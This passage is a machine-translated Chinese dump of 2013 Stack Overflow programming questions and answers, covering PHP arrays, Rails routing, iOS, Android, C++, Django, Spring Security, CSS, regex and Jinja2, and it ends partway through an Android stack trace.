> 
> 时间：2013-04-06T06:38:17.867
> 
> 标签：php, arrays

假设我们有数组：

```
$array1 = array (
    'key1' => 1,
    'non1' => 1,
    'key2' => 1,
    'non2' => 1,
    'non3' => 1,
    'non4' => 1,
    'key3' => 1,
    'key4' => 1
); 
```

如何移动所有具有`key name`LIKE的键`"key"`并将它们移动到另一个数组。

```
$array2 = movekey('key',$array1); 
```

会给：

```
array1 = array (
    'non1' => 1,
    'non2' => 1,
    'non3' => 1,
    'non4' => 1

);

array2 = array (
    'key1' => 1,
    'key2' => 1,
    'key3' => 1,
    'key4' => 1
); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:48:58.270

```
$array2 = array();
   foreach($array1 as $key => $val) {
     if(strpos($key,'key')!==false){
        $array2[$key] = $val; //Copy all the values that have key-name like 'key'.
        unset($array1[$key]); //Removes the copied key and value.
     }
   } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T06:41:05.887

```
$result = array();
foreach ($array as $key => $value) {
  if (strpos($key, 'key') !== false) {
    $result[$key] = $value;
  }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-06T07:00:28.287

只是因为它看起来很有趣，所以按照 OP 的原始愿望把它放在函数形式中：

```
function moveKey($cmp, Array & $ar)
{
    $y = array();
    foreach($ar as $key => $value) {
        if(strpos($key, $cmp) !== false) {
            $y[$key] = $value;
            unset($ar[$key]);
        }
    }
    return $y;
} 
```

然后测试功能：

```
$array1 = array (
    'key1' => 1,
    'non1' => 1,
    'key2' => 1,
    'non2' => 1,
    'non3' => 1,
    'non4' => 1,
    'key3' => 1,
    'key4' => 1
);

$a2 = moveKey('key', $array1);
echo "<pre>". print_r($array1, true) ."\n". print_r($a2, true) ."</pre>"; 
```

它输出：

```
Array
(
    [non1] => 1
    [non2] => 1
    [non3] => 1
    [non4] => 1
)

Array
(
    [key1] => 1
    [key2] => 1
    [key3] => 1
    [key4] => 1
) 
```

玩得开心！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-06T07:06:45.773

```
foreach (array_keys($array1) as $key) {
    if (!preg_match('/^key\d+/', $key)) {
        unset($array1[$key]);
    }
}
print_r ($array1); 
```

# ruby-on-rails - 在 Rails 中添加视图

> ID：15847902
> 
> 赞同：1
> 
> 时间：2013-04-06T06:38:20.917
> 
> 标签：ruby-on-rails, ruby-on-rails-3, model-view-controller, view

在 Rails 中 -

我正在尝试添加一个`view`，让我们称之为它`view3`，但被告知`there are no available routes`。我也尝试过`rake routes`，确实没有添加我的附加视图。

我试图做什么：我添加了一个`.html.erb`视图文件，并在具有我添加的当前视图的类下的控制器中：

```
def view3
end 
```

如果有额外的步骤，我还应该做什么？我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:42:06.403

您需要将路由（URL 和控制器操作之间的映射）添加到`config/routes.rb`文件中。这看起来像这样（假设`things`是您正在建模的资源）：

```
match '/things' => 'things#view3', :via => :get 
```

`rake routes`只列出已经存在的路由。

阅读本指南了解更多详情： http: [//guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T10:04:28.007

在路线中，您可以添加：

```
resources :your_controller_name 
```

它将从您的控制器添加或您的视图

或者更多路由选项，也可以参考以下文档：

[从外到内的 Rails 路由](http://guides.rubyonrails.org/routing.html)

# iphone - LinPhone SDK 不支持 arm7s

> ID：15847906
> 
> 赞同：1
> 
> 时间：2013-04-06T06:38:56.920
> 
> 标签：iphone, ios, ipad, linphone

我是 ios 应用程序开发的新手。现在我正在使用 LinPhone SDK 开发视频通话应用程序。它目前在模拟器中完美运行。但是，当我在 iOS 设备中构建时，它显示错误

```
ld: file is universal (3 slices) but does not contain a(n) armv7s slice: /Volumes/Work/Sample/liblinphone-sdk/apple-darwin/lib/libzrtpcpp.a for architecture armv7s
collect2: ld returned 1 exit status
Command /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/llvm-gcc-4.2 failed with exit code 1 
```

如果有人知道如何解决这个问题？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:45:13.400

您的库不支持的是 arm7s，而不是 arm7。由于模拟器编译为 x86，因此缺少 arm7s 支持不是问题。但是，在实际设备上...

解决方法是进入你的项目设置，选择Build Settings，点击all，然后在右上角的搜索栏里输入arm。然后，您应该会看到一条写有 arm7 arm7s 的行。单击它，将出现一个下拉菜单。选择arm7s并点击小-。您现在已经在您的项目中禁用了对 arm7s 的支持，该项目现在应该构建。

# javascript - Canvas KineticJS - 单击按钮时重新绘制一些东西

> ID：15847915
> 
> 赞同：0
> 
> 时间：2013-04-06T06:40:20.273
> 
> 标签：javascript, canvas, html5-canvas, kineticjs

我使用 kineticjs 库。我创建了这样一行（[http://jsfiddle.net/zP364/](http://jsfiddle.net/zP364/)）

```
var redLine = new Kinetic.Line({
    points: [973, 570, 340, 423, 450, 60, 500, 20],
    stroke: 'red',
    strokeWidth: 15,
    lineCap: 'round',
    lineJoin: 'round',
    draggable: true
}); 
```

当我单击更改按钮时，我希望行必须像这样更改。谢谢

```
document.getElementById('change').addEventListener('click', function() {
        redLine.point = [600, 400, 300, 100, 700, 80, 200, 30]; // i want re-draw line 
        redLine.stroke = 'blue'; // and change color
        layer.draw();
}, false); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T15:05:41.447

不是 redLine.point...使用 redLine.setPoints(newPointsArray)

```
redLine.setPoints([600, 400, 300, 100, 700, 80, 200, 30]); 
```

在这里查看一些好的 KineticJS 教程：[http ://www.html5canvastutorials.com/kineticjs/html5-canvas-events-tutorials-introduction-with-kineticjs/](http://www.html5canvastutorials.com/kineticjs/html5-canvas-events-tutorials-introduction-with-kineticjs/)

**并在此处查看 KineticJS 文档：** [http ://kineticjs.com/docs/symbols/Kinetic.Line.php#setPoints](http://kineticjs.com/docs/symbols/Kinetic.Line.php#setPoints)

# c# - 如何以编程方式浏览网络浏览器？

> ID：15847916
> 
> 赞同：1
> 
> 时间：2013-04-06T06:40:32.107
> 
> 标签：c#, webbrowser-control

我想使用定义的函数导航我的网络浏览器，例如：

```
webbrowser1.navigate (my defined function); 
```

此网络浏览器在用户控件中定义，因此任何人都可以更改其默认网页

如何定义路径设置的函数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:44:19.117

试试下面的代码：

```
HtmlElementCollection ele = this.webBrowserControl.Document.GetElementsByTagName("Form");  

foreach(HtmlElement currentElement in ele)
{
    currentElement.InvokeMember("submit");
} 
```

或者

```
webbrowser.Document.All["ID OF ELEMENT"].InvokeMember("click"); 
```

希望它有帮助。

# ios - 动态高度 uilabel

> ID：15847919
> 
> 赞同：1
> 
> 时间：2013-04-06T06:40:44.933
> 
> 标签：ios, uilabel

我正在尝试随着文本宽度的变化动态更改 uilabel 高度，但是当我尝试使用这条线“white wallington hall”时出现问题。基本上它计算 uilabel 中两行的宽度，但是当它显示为两行时，它看起来像这样：

```
"white   
 wallington h..." 
```

示例代码：

```
 UILabel* lbl_Property = [[UILabel alloc]init];
   [lbl_Property setFont:[UIFont fontWithName:@"Arial" size:10]];
   [lbl_Property setNumberOfLines:0];
   [lbl_Property setText:[arr_SubDetail objectAtIndex:x]];
   UIFont* font = [UIFont fontWithName:@"Arial" size:10];
   CGSize stringSize = [lbl_Property.text sizeWithFont:font];
   CGFloat width = stringSize.width;

   [lbl_Property setFrame:CGRectMake(lbl_Property.frame.origin.x, lbl_Property.frame.origin.y, lbl_Property.frame.size.width,5+lbl_Property.frame.size.height*(ceilf(width/110)))]; 
```

实际上，在“white”之后有一个空格，而“wallington”不在该行中，所以它换了一个新行，但它没有显示完整的文本

如何让它正确显示？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T06:38:37.637

试试看....

```
//Calculate the expected size based on the font and linebreak mode of your label
CGSize maximumLabelSize = CGSizeMake(296,9999);

CGSize expectedLabelSize = [yourString sizeWithFont:yourLabel.font 
                    constrainedToSize:maximumLabelSize 
                    lineBreakMode:yourLabel.lineBreakMode]; 

//adjust the label the the new height.
CGRect newFrame = yourLabel.frame;
newFrame.size.height = expectedLabelSize.height;
yourLabel.frame = newFrame; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T06:53:13.423

```
 int h=10;    
 UILabel *lbl_headitem = [[UILabel alloc]initWithFrame:CGRectMake(3,h, 690, size_txt_overview1.height)];// See the 'h' value
 lbl_headitem.text = [headItemArray objectAtIndex:k];
 [lbl_headitem setTextAlignment:UITextAlignmentLeft];
 [lbl_headitem setBackgroundColor:[UIColor clearColor]];
 [lbl_headitem setTag:k];
 lbl_headitem.numberOfLines=0;  
 [lbl_headitem setTextColor:[UIColor redColor]];
 [lbl_headitem setFont:[UIFont fontWithName:@"Helvetica" size:18]];
 [scrollAttributes addSubview:lbl_headitem];
 h = h + size_txt_overview1.height; 
```

**确保您的 label.numberOfLines 设置为 0**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T07:13:05.070

希望下面的代码可以工作

```
CGSize size = [str sizeWithFont:lbl.font constrainedToSize:CGSizeMake(204.0, 10000.0) lineBreakMode:lbl.lineBreakMode]; 
```

这里的宽度或高度必须是固定的..

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-10-07T13:06:58.380

```
func makeSizeSender(name:UILabel){

    let attributes = [NSFontAttributeName : name.font]
    let rect = name.text!.boundingRectWithSize(CGSizeMake(frame.size.width, CGFloat.max), options: NSStringDrawingOptions.UsesLineFragmentOrigin, attributes: attributes, context: nil)
    name.frame = CGRectMake(contentView.frame.origin.x+30, 0, 200, rect.height+30);
    self.addSubview(name)

} 
```

# php - 可拖动的 jquery 弹出窗口

> ID：15847920
> 
> 赞同：1
> 
> 时间：2013-04-06T06:40:49.317
> 
> 标签：php, jquery

我有一个可拖动的 jquery 弹出窗口，现在它在其正文中显示一条消息。但我想在弹出窗口中加载一个 html 页面我该怎么做

这是我的弹出窗口的屏幕截图

![在此处输入图像描述](https://i.stack.imgur.com/qwFBR.png)

这是我的代码 popup.php

```
<!DOCTYPE html>
<html>
<head>
    <link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css" rel="stylesheet" type="text/css"/>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js"></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js"></script>
    <style type="text/css">
        #draggable { width: 200px; height: 250px; background: silver; }
    </style>
    <script>
        $(document).ready(function() {
            $("#draggable").draggable();
        });
    </script>
</head>
<body style="font-size:75%;">

    <div id="draggable">Drag me</div>

</body>
</html> 
```

请帮助我，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:43:00.627

只需使用[负载](http://api.jquery.com/load/)：

```
$('#draggable').load('filetoload.html'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:48:01.020

尝试使用`.load()`并制作它`.draggable()`：

```
$(document).ready(function() {
    $("#draggable").load('yourtargetpage.php').draggable();
}); 
```

# c++ - 为什么即使该对象没有复制构造函数，也可以按值传递对象？

> ID：15847921
> 
> 赞同：0
> 
> 时间：2013-04-06T06:40:53.443
> 
> 标签：c++

根据[这个问题](https://stackoverflow.com/questions/665781/copy-constructor-in-c-is-called-when-object-is-returned-from-a-function)，当对象按值传递给另一个函数时，会调用一个复制构造函数。

我删除了我的复制构造函数作为测试，但仍然可以按值传递它。这有意义吗？

我注释掉了复制构造函数：

```
 /*
Matrix4(const Matrix4<T>& m)
{
    x.x = m.x.x; x.y = m.x.y; x.z = m.x.z; x.w = m.x.w;
    y.x = m.y.x; y.y = m.y.y; y.z = m.y.z; y.w = m.y.w;
    z.x = m.z.x; z.y = m.z.y; z.z = m.z.z; z.w = m.z.w;
    w.x = m.w.x; w.y = m.w.y; w.z = m.w.z; w.w = m.w.w;
}
 */

typedef Matrix4<float> mat4; 
```

然后编译并运行良好：

```
void ttt(mat4 hi){

}

void yyy(){
    mat4 x;
    ttt(x);
} 
```

那么在这种情况下可能不会调用复制构造函数？这里发生了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:42:06.823

如果您不提供复制构造函数，编译器会为您生成一个，当您按值传递时会使用该构造函数（在 C++11 中，也有可能在某些情况下调用移动复制构造函数。）禁用它，您应该将其声明为私有，或者`delete`在 C++11 中声明它：

```
class Foo
{
 private:
  Foo(const Foo&);
};

class Foo11
{
 public:
  Foo(const Foo&) = delete;
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:42:26.250

如果没有指定构造函数，C++ 会自己创建一个无参数构造函数和一个复制构造函数。它只是执行对象的副本。

# android - 在 android 中使用 Video View 播放视频

> ID：15847922
> 
> 赞同：0
> 
> 时间：2013-04-06T06:40:56.480
> 
> 标签：android, android-videoview, seekbar

我已经使用视频视图实现了一个视频播放器。默认搜索栏和控制按钮显示在屏幕底部。我希望它应该在视频视图中。我怎样才能做到这一点。我也在添加代码。

活动代码是：

```
 @Override
   public void onCreate(Bundle icicle) {
     super.onCreate(icicle);
     setContentView(R.layout.main);
     mVideoView = (VideoView) findViewById(R.id.surface_view);
     System.out.println(Uri.parse("android.resource://" + getPackageName() +"/"+R.raw.scotch_cppk));
     mVideoView.setVideoURI(Uri.parse("android.resource://" + getPackageName() +"/"+R.raw.scotch_cppk));
     mVideoView.setMediaController(new MediaController(this));
     mVideoView.start();

   } 
```

主.xml：

```
<?xml version="1.0" encoding="utf-8"?> 
<LinearLayout xmlns:android="schemas.android.com/apk/res/android"; android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent"> 
<VideoView android:id="@+id/surface_view" 
      android:layout_gravity="center" 
      android:layout_width="600dp" 
      android:layout_height="800dp"/> 
</LinearLayout> 
```

# dependency-injection - EJB JAX-RS @Context HttpServletRequest NullPointerException - 为什么？

> ID：15847925
> 
> 赞同：4
> 
> 时间：2013-04-06T06:41:18.403
> 
> 标签：dependency-injection, ejb, jax-rs, resteasy, apache-tomee

考虑以下服务：

```
@Path("/")
@Stateless
public class SomethingService {

    @Context
    final HttpServletRequest request

    @POST
    @Path("post/something/")
    @Produces("application/json; charset=UTF-8")
    public String addSomething(@FormParam("something") final String something) {
        // access to request methods results in NullPointerException
    }
} 
```

我`NullPointerException`在方法执行时得到一个，尽管从调试的角度来看，我注意到`request`这并不是真正`null`的，而是`org.apache.openejb.rest.ThreadLocalHttpServletRequest`. 当我将`@Context`注入移动到方法参数级别时，一切正常：

```
public String addSomething(@FormParam("something") final String something,
    @Context final HttpServletRequest request) { ... } 
```

这是什么原因？据我记得，在我将服务设为 EJB 之前它曾经工作过（我这样做是为了使用`@EJB`或`@Inject`可能注入 DAO）。JAX-RS 是否为每个请求创建此类服务的实例，从而能够通过类级别注入`@Context`？EJB 是否通过在 JAX-RS 可以做任何事情之前创建实例并填充代理对象来防止这种情况？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-17T17:34:32.563

解决一个老问题-

当你把它变成无状态时，它变成了一个单例模型，所以注入字段不再是线程安全的。当您将 jax-rs 服务转换为 Spring bean 时，也会发生同样的事情。更安全的方法是您提到的解决方法，并注入方法参数。

# javascript - 在变量中加载网页内容存储

> ID：15847926
> 
> 赞同：0
> 
> 时间：2013-04-06T06:41:24.520
> 
> 标签：javascript, xml, variables

我正在尝试将网页内容加载到 div：-

```
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <script type="text/javascript" src="http://j.maxmind.com/app/geoip.js" ></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script>
    function load(){
                        var location = "http://services.gisgraphy.com/geoloc/search?lat=43.00034713745117&lng=-75.4999008178711&radius=7000";
                                    $("#siteloader").html('<object data="'+location+'">');
                        }
        </script>
    <body onload="load()">
    <div id="siteloader"></div>​
    </body>
    </head>
</html> 
```

完成此代码以将网页内容加载到 div 中，现在我想将此内容存储到一个`variable`知道它如何可能的人中。

# php - 如何用php在手机上发送短信

> ID：15847928
> 
> 赞同：-2
> 
> 时间：2013-04-06T06:41:35.580
> 
> 标签：php

如何使用 php 代码发送短信？是否有任何免费的网络服务用于在 php 中在移动设备上发送短信？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:43:01.533

您需要一个短信提供商 api。像[特威罗](http://www.twilio.com/)。

# css - 如何控制类规范的优先级

> ID：15847929
> 
> 赞同：3
> 
> 时间：2013-04-06T06:41:44.150
> 
> 标签：css

我有一些具有类的 DOM 元素`foo`和`bar`：

```
<div class="foo bar">...</div> 
```

我想控制它们之间的优先级。遵循[w3c 规范](http://www.w3.org/TR/selectors/#specificity)，我认为向 css 添加额外的选择器可能会使优先级更高。例如，如果我想`foo`覆盖`bar`，我正在考虑放置一个这样的`dummy`类：

```
.foo, .dummy{
  ...
}

.bar{
  ...
} 
```

这行得通吗？有一个更好的方法吗？我知道`!important`可以控制单个属性，但我想要一个更通用的解决方案来控制整个类规范的优先级。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:47:02.203

如果您首先为 .bar 类添加规则，然后为 .foo 添加规则，则 .foo 规则将覆盖 .bar 的规则

例子：

```
.bar {
    color : red;
}

.foo {
    color: blue;
} 
```

div 的颜色为蓝色。

您建议的内容将起作用，但您需要将虚拟类添加到 div （以便 css 选择器匹配）

例子：

```
<div class="foo bar dummy">...</div> 
```

# python - 调用'syncdb'时出现Django depracation错误

> ID：15847931
> 
> 赞同：2
> 
> 时间：2013-04-06T06:41:47.667
> 
> 标签：python, django, virtualenv

我正在开发我的第一个 Django 应用程序，但遇到了一个奇怪的错误。我查看[了它](https://stackoverflow.com/questions/10884053/why-do-i-get-this-error-when-i-run-python-manage-py-syncdb-all)并检查了我正在使用的 Django 文档 1.5.1 版本，它没有说明这个错误。

```
pat.py:9: DeprecationWarning: django.utils.hashcompat is deprecated; use hashlib instead
DeprecationWarning)

TypeError: __init__() got an unexpected keyword argument 'verify_exists' 
```

我正在使用一个虚拟环境，其中安装了 Django 以及（pip freeze 输出）：

```
Django==1.5.1
argparse==1.2.1
django-db-log==2.2.1
psycopg2==2.4.6
wsgiref==0.1.2
yolk==0.4.3 
```

此外，重要的是要注意我`python manage.py syncdb`在停用虚拟环境时尝试运行 - 没有错误。此错误仅在我使用虚拟环境时发生。有任何想法吗？在此先感谢，如果这是一个小问题，我很抱歉，我对 Django 很陌生！

编辑：我发现[这](https://stackoverflow.com/questions/15186754/run-manage-py-syncdb-error-with-django-1-5?rq=1)看起来很有希望，但通过我唯一的模型，我从不使用 URLField()...

EDIT2：我唯一的models.py：

```
from django.db import models

class Category(models.Model):
    name = models.CharField(max_length=50)
    slug = models.SlugField(max_length=50, unique=True, help_text='Unique value for product page URL, created from name.')
    description = models.TextField()
    is_active = models.BooleanField(default=True) 
    meta_keywords = models.CharField("Meta Keywords", max_length=255, help_text='Comma-delimited set of SEO keywords for meta tag')
    meta_description = models.CharField("Meta description", max_length=255, help_text='Content for description meta tag')
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        db_table = 'categories'
        ordering = ['-created_at']
        verbose_name_plural = 'Categories'

    def __unicode__(self):
        return self.name

    @models.permalink
    def get_absolute_url(self):
        return ('catalog_category', (), {'category_slug': self.slug})

class Product(models.Model):
    name = models.CharField(max_length=255, unique=True)
    slug = models.SlugField(max_length=255, unique=True, help_text= 'Unique value for product page URL, create from name.')
    brand = models.CharField(max_length=50)
    sku = models.CharField(max_length=50)
    price = models.DecimalField(max_digits=9, decimal_places=2)
    old_price = models.DecimalField(max_digits=9, decimal_places=2, blank=True, default=0.00)
    image = models.CharField(max_length=50)
    is_active = models.BooleanField(default=True)
    is_bestseller = models.BooleanField(default=False)
    is_featured = models.BooleanField(default=False)
    quantity = models.IntegerField()
    description = models.TextField()
    meta_keywords = models.CharField(max_length=255, help_text='Comma-delimited set of SEO keywords for meta tag')
    meta_description = models.CharField(max_length=255, help_text='Content for description meta tag')
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    categories = models.ManyToManyField(Category)

    class Meta:
        db_table = 'products'
        ordering = ['-created_at']

    def __unicode__(self):
        return self.name

    @models.permalink
    def get_absolute_url(self):
        return('catalog_product', (), {'product_slug': self.slug})

    def sale_price(self):
        if (self.old_price > self.price):
            return self.price
        else: 
            return None 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T07:15:32.943

我想我找到了原因，查看了您项目中安装的应用程序。我发现`django-db-log`use `models.URLField(verify_exists=False, null=True, blank=True)`，它在新版本中已被弃用。

他们的项目还没有升级，所以也许你可以在他们的项目中拉一个请求或卸载那个应用程序

更新：来自@NathanVillaescusa

```
 from django.utils.hashcompat import md5_constructor //deprecated also 
```

# java - 防止重定向到 Spring Security 的登录

> ID：15847932
> 
> 赞同：18
> 
> 时间：2013-04-06T06:41:48.210
> 
> 标签：java, spring, security, redirect, spring-mvc

我有 Spring MVC + Spring Security 项目。

```
<http auto-config="true" access-denied-page="/security/accessDenied" use-expressions="true" disable-url-rewriting="true">

... 
<intercept-url pattern="/dashboard/myaccount/**" access="hasAnyRole('ROLE_PERSON', 'ROLE_DEALER')"/>
...

<form-login login-page="/security/login" authentication-failure-url="/security/login?error=true"
                default-target-url="/security/success" username-parameter="email"
                password-parameter="secret"/>
<logout invalidate-session="true" logout-success-url="/index" logout-url="/security/logout"/> 
```

如果用户进入登录页面，如果成功将被重定向到“/security/success”，我在控制器中使用会话对象执行更多操作（记录用户 ID 等）

我的问题是当一个 GUEST 用户要去 /dashboard/myaccount （需要 AUTH）时，他被重定向到 LOGIN 页面（我不想要，我更喜欢抛出 404）。之后 Spring Security 不会重定向到 /security/success。而是重定向到 /dashboard/myaccount。

我希望找到一种方法来完全禁用此重定向到登录页面，以防 GUEST 尝试访问 AUTH 页面。

有什么办法吗？

肿瘤坏死因子

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-08T09:25:58.140

我们添加一个新的 authenticationEntryPoint：

```
<http auto-config="true" access-denied-page="/security/accessDenied" use-expressions="true"
      disable-url-rewriting="true" entry-point-ref="authenticationEntryPoint"/>

<beans:bean id="authenticationEntryPoint" class="a.b.c..AuthenticationEntryPoint">
    <beans:constructor-arg name="loginUrl" value="/security/login"/>
</beans:bean>

public class AuthenticationEntryPoint extends LoginUrlAuthenticationEntryPoint {    
    public AuthenticationEntryPoint(String loginUrl)  {
        super(loginUrl);
    }

    @Override
    public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException {
        response.sendError(403, "Forbidden");
    }
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2015-06-09T11:07:51.200

在 SpringSecurity 4 中的注释配置中，您可以执行以下操作：

```
public class SecurityConfig extends WebSecurityConfigurerAdapter {

@Override
protected void configure(HttpSecurity http) throws Exception {
    // ....
    http.exceptionHandling().authenticationEntryPoint(new AuthenticationEntryPoint() {

        @Override
        public void commence(HttpServletRequest request, HttpServletResponse response,
                AuthenticationException authException) throws IOException, ServletException {
            if (authException != null) {
                response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                response.getWriter().print("Unauthorizated....");
            }
        }
    });
    // ....
} 
```

}

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-06T06:49:58.263

发现这个：总是使用默认目标=“真”

这样，我的控制器功能总是在任何登录后被调用。

# regex - 正则表达式仅从字符串中获取数值

> ID：15847939
> 
> 赞同：2
> 
> 时间：2013-04-06T06:42:33.910
> 
> 标签：regex, vb.net

我想从下面的字符串中获取**116.83**和**81.16 。**我试过**\d**但它也从**up2**和**dn2**中选择了 2 。我怎么能忽略这个。

```
<td align="right">
    116.83<span class="up2"></span><br>81.16<span class="dn2"></span>
</td> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T07:02:53.300

```
\b[\d.]+\b 
```

`\b`匹配单词和非单词字符之间的边界，但不包括匹配中的相邻字符。由于字母和数字都是单词字符，它不会在`p`and之间匹配`2`，所以`up2`不匹配。But`>`是一个非单词字符，因此它在`>`and之间匹配`8`，因此正则表达式匹配`81.16`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:53:28.193

尝试这样的事情：

```
[>\s]+([\d\.]+)[<\s]+ 
```

但请务必从第一级匹配中去除前导`>`和空格以及尾随`<`和空格，或者仅获取第二级匹配。

# google-app-engine - webapp2_extras.jinja2 从变量编译模板

> ID：15847948
> 
> 赞同：0
> 
> 时间：2013-04-06T06:43:16.517
> 
> 标签：google-app-engine, jinja2, webapp2

拥有这个属性来获取 jinja2 类的实例

```
@webapp2.cached_property
    def jinja2(self):
        # Returns an instance of :class:`Jinja2` from the app registry.
        return jinja2.get_jinja2(app=self.app) 
```

参考：[http ://webapp-improved.appspot.com/api/webapp2_extras/jinja2.html](http://webapp-improved.appspot.com/api/webapp2_extras/jinja2.html)

我可以看到返回的类有模块模板，但我不知道如何导入它。

我希望能够从返回的类中加载这个模块，这样我就可以执行以下操作：`temp = Template('{{name}}')`

帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:59:09.120

这就是我所做的。

```
values = { 'name' : 'user1791567' }

import sys
mod = sys.modules['jinja2.environment']

_template = mod.Template('{{name}}')

self.jinja2.render_template(_template, **values) 
```

并且工作了！！！..

# android - 如何解决 Fragment 中的以下错误和异常？

> ID：15847952
> 
> 赞同：0
> 
> 时间：2013-04-06T06:43:32.953
> 
> 标签：android, android-fragments, fragment

**我正在处理它显示以下错误和异常的片段...在运行时..帮助我解决这些错误和接收**并且模拟器还显示消息ui已停止..我在android编程中是新的...

```
enter code here04-06 11:45:03.251: I/dalvikvm(707): threadid=3: reacting to signal 3
04-06 11:45:03.420: I/dalvikvm(707): Wrote stack traces to '/data/anr/traces.txt'
04-06 11:45:03.671: D/AndroidRuntime(707): Shutting down VM
04-06 11:45:03.671: W/dalvikvm(707): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
04-06 11:45:03.691: I/dalvikvm(707): threadid=3: reacting to signal 3
04-06 11:45:03.731: E/AndroidRuntime(707): FATAL EXCEPTION: main
04-06 11:45:03.731: E/AndroidRuntime(707): java.lang.RuntimeException: Unable to start activity 
  ComponentInfo{com.example.android.fragments/com.example.android.fragments.MainActivity}:  
                      android.view.InflateException: Binary XML file line #23: Error inflating class fragment
            04-06 11:45:03.731: E/AndroidRuntime(707):  at         
           android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)  
        04-06 11:45:03.731: E/AndroidRuntime(707):  at  
                android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
   04-06 11:45:03.731:E/AndroidRuntime(707): at android.app.ActivityThread.access$600(ActivityThread.java:123)
     04-06 11:45:03.731: E/AndroidRuntime(707):     at 
                   android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
       04-06 11:45:03.731:E/AndroidRuntime(707):at android.os.Handler.dispatchMessage(Handler.java:99)
  04-06 11:45:03.731: E/AndroidRuntime(707):at android.os.Looper.loop(Looper.java:137)
 04-06 11:45:03.731:E/AndroidRuntime(707):at android.app.ActivityThread.main(ActivityThread.java:4424)
 04-06 11:45:03.731:E/AndroidRuntime(707):at java.lang.reflect.Method.invokeNative(Native Method)
 04-06 11:45:03.731: E/AndroidRuntime(707):at java.lang.reflect.Method.invoke(Method.java:511)
        04-06 11:45:03.731: E/AndroidRuntime(707):  at 
 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
  04-06 11:45:03.731:E/AndroidRuntime(707):at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
 04-06 11:45:03.731:E/AndroidRuntime(707):at dalvik.system.NativeStart.main(Native Method)
 04-06 11:45:03.731:E/AndroidRuntime(707): Caused by: android.view.InflateException: Binary XML file line #23: 
 Error inflating class fragment
 04-06 11:45:03.731: E/AndroidRuntime(707):     at 
 android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:697)
      04-06 11:45:03.731: E/AndroidRuntime(707):    at 
        android.view.LayoutInflater.rInflate(LayoutInflater.java:739)
      04-06 11:45:03.731: E/AndroidRuntime(707):    at  
      android.view.LayoutInflater.inflate(LayoutInflater.java:489)
         04-06 11:45:03.731: E/AndroidRuntime(707):     at 
     android.view.LayoutInflater.inflate(LayoutInflater.java:396)
         04-06 11:45:03.731: E/AndroidRuntime(707):     at 
              android.view.LayoutInflater.inflate(LayoutInflater.java:352)
        04-06 11:45:03.731: E/AndroidRuntime(707):  at 

        04-06 11:45:03.731: E/AndroidRuntime(707):  at android.app.Activity.setContentView(Activity.java:1835)
          04-06 11:45:03.731: E/AndroidRuntime(707):    at  
        com.example.android.fragments.MainActivity.onCreate(MainActivity.java:30)
        04-06 11:45:03.731: E/AndroidRuntime(707):  at android.app.Activity.performCreate(Activity.java:4465)
         04-06 11:45:03.731: E/AndroidRuntime(707):     at 
      android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
       04-06 11:45:03.731: E/AndroidRuntime(707):   at 
            android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
    04-06 11:45:03.731: E/AndroidRuntime(707):  ... 11 more
    04-06 11:45:03.731: E/AndroidRuntime(707): Caused by: java.lang.IllegalStateException: Content view not yet    
       created
    04-06 11:45:03.731: E/AndroidRuntime(707):  at 
   android.support.v4.app.ListFragment.ensureList(ListFragment.java:328)
    04-06 11:45:03.731: E/AndroidRuntime(707):  at 
